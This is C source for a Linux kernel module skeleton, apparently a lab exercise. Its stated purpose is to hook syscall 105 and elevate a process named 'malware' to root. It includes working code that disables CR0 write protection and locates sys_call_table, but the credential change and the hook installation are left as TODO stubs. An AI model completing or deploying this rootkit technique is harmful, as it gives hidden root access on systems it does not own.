#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/unistd.h>
#include <linux/time.h>
#include <linux/sched.h>
#include <linux/kallsyms.h>
#include <linux/cred.h>
#include <linux/pid.h>
#include <linux/pid_namespace.h>
#include <asm/cacheflush.h>

#define TARGET_PROC_NAME "malware"
#define __NR_syscall 105

static struct task_struct *target_task = NULL;
static unsigned long *sys_call_table;
static int target_pid = -1;
module_param(target_pid, int, 0);

unsigned int clear_and_return_cr0(void);
void setback_cr0(unsigned int val);
static long sys_mycall(uid_t uid);

int orig_cr0;
static long (*anything_saved)(uid_t);

/* CR0 operation functions */
unsigned int clear_and_return_cr0(void)
{
    unsigned int cr0 = 0;
    unsigned int ret;
    asm volatile ("movq %%cr0, %%rax" : "=a"(cr0));
    ret = cr0;
    cr0 &= 0xfffeffff; // clear WP bit
    asm volatile ("movq %%rax, %%cr0" :: "a"(cr0));
    return ret;
}

void setback_cr0(unsigned int val)
{
    asm volatile ("movq %%rax, %%cr0" :: "a"(val));
}

/* Custom syscall */
static long sys_mycall(uid_t uid)
{
    if (target_task && current == target_task) {
        /* TODO: create new credentials and set UID/GID to 0 */
        return 0;
    }

    return anything_saved(uid);
}

/* Find target process */
static int find_target_process(void)
{
    if (target_pid > 0) {
        /* TODO: find process by PID and assign target_task */
        if (target_task)
            return 0;
    }

    /* TODO: find process by name if PID not specified */
    return -ESRCH;
}

/* Module init */
static int __init init_hook(void)
{
    printk(KERN_INFO "HookSyscall Module Loaded\n");

    if (find_target_process() != 0)
        return -ESRCH;

    sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
    if (!sys_call_table)
        return -EINVAL;

    anything_saved = (long (*)(uid_t))sys_call_table[__NR_syscall];

    /* TODO: disable write protection and replace syscall */
    
    printk(KERN_INFO "Installed hook for syscall %d\n", __NR_syscall);
    return 0;
}

/* Module exit */
static void __exit exit_hook(void)
{
    /* TODO: restore original syscall */

    printk(KERN_INFO "HookSyscall Module Unloaded\n");
}

module_init(init_hook);
module_exit(exit_hook);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Your Name");
MODULE_DESCRIPTION("Kernel module to hook syscall for privilege elevation");
